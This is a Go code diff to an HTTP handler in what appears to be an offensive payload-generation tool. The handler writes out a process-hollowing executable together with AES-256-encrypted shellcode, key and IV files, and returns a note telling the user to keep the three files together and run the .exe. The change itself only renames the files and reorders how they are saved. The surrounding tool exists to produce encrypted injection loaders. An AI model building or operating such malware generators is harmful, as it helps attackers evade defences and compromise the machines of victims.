@@ -774,49 +774,45 @@ func hGenerateProcessHollow(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	baseName := "process-hollow"
-	if name := strings.TrimSpace(opts.Name); name != "" {
-		baseName = "process-hollow-" + name
+	baseName := strings.TrimSpace(opts.Name)
+	if baseName == "" {
+		baseName = "payload"
 	}
 
-	// Save the executable
+	// Save .exe
 	exePath, err := saveArtifact(dir, baseName+".exe", executable)
 	if err != nil {
 		writeErr(w, err, 400)
 		return
 	}
 
-	// Save the encrypted payload
-	payloadPath, err := saveArtifact(dir, baseName+"-payload.bin", encrypted)
-	if err != nil {
-		writeErr(w, err, 400)
-		return
-	}
-
-	// Save the AES key
+	// Save key.bin
 	keyPath, err := saveArtifact(dir, baseName+"-key.bin", key)
 	if err != nil {
 		writeErr(w, err, 400)
 		return
 	}
 
-	// Save the AES IV
+	// Save iv.bin
 	ivPath, err := saveArtifact(dir, baseName+"-iv.bin", iv)
 	if err != nil {
 		writeErr(w, err, 400)
 		return
 	}
 
+	// Save payload.bin
+	payloadPath, err := saveArtifact(dir, baseName+"-payload.bin", encrypted)
+	if err != nil {
+		writeErr(w, err, 400)
+		return
+	}
+
 	writeJSON(w, map[string]any{
-		"executable":     exePath,
-		"payload":        payloadPath,
-		"key":            keyPath,
-		"iv":             ivPath,
-		"executableSize": len(executable),
-		"payloadSize":    len(encrypted),
-		"keySize":        len(key),
-		"ivSize":         len(iv),
-		"note":           "Process hollowing payload with AES-256 encrypted shellcode. All files must be in the same directory. Rename payload.bin, key.bin, iv.bin as needed, then execute the .exe",
+		"exe":     exePath,
+		"key":     keyPath,
+		"iv":      ivPath,
+		"payload": payloadPath,
+		"note":    "Process hollowing with AES-256. Keep all 3 files in same directory and execute the .exe",
 	})
 }
 
